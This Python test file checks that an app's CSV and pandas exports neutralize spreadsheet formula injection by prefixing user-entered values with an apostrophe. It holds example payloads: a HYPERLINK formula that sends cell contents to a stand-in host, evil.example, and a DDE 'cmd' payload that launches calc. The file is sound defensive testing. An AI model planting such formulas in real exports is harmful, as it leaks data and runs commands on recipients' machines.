"""Exports must not hand spreadsheets a formula from user-entered text."""
import csv
import io
from datetime import date
from decimal import Decimal

import pandas as pd
import pytest
from fastapi.testclient import TestClient

from app.database import SessionLocal
from app.export_safety import neutralize, safe_csv_writer, safe_df
from app.main import app
from app.models import Model

EVIL = '=HYPERLINK("https://evil.example/?"&A1,"open")'


@pytest.mark.parametrize("value", [EVIL, "+1+cmd|' /C calc'!A0", "-2+3", "@SUM(A1)", "\t=1", "\r=1"])
def test_formula_text_is_neutralized(value):
    assert neutralize(value) == "'" + value


@pytest.mark.parametrize("value", ["-50.00", "+12", "-1,234.50", "Lexie Lynn", "", "a=b", 5, Decimal("-3"), None])
def test_numbers_and_plain_text_are_untouched(value):
    assert neutralize(value) == value


def test_safe_df_and_csv_writer():
    df = pd.DataFrame({"name": [EVIL, "ok"], "amount": [-50, 10]})
    out = safe_df(df)
    assert list(out["name"]) == ["'" + EVIL, "ok"]
    assert list(out["amount"]) == [-50, 10]
    assert df["name"][0] == EVIL  # original untouched

    buf = io.StringIO()
    safe_csv_writer(buf).writerow([EVIL, "-50.00"])
    assert next(csv.reader(io.StringIO(buf.getvalue()))) == ["'" + EVIL, "-50.00"]


def test_models_csv_export_neutralizes_a_formula_name():
    session = SessionLocal()
    try:
        session.add(
            Model(
                status="Active",
                code="EVIL1",
                real_name=EVIL,
                working_name=EVIL,
                start_date=date(2025, 1, 1),
                payment_method="Crypto",
                payment_frequency="monthly",
                amount_monthly=Decimal("100"),
            )
        )
        session.commit()
    finally:
        session.close()

    client = TestClient(app)
    client.post("/login", data={"username": "admin", "password": "admin"}, follow_redirects=False)
    resp = client.get("/models/export")
    assert resp.status_code == 200
    cells = [cell for row in csv.reader(io.StringIO(resp.text)) for cell in row]
    assert EVIL not in cells, "raw formula reached the CSV"
    assert "'" + EVIL in cells
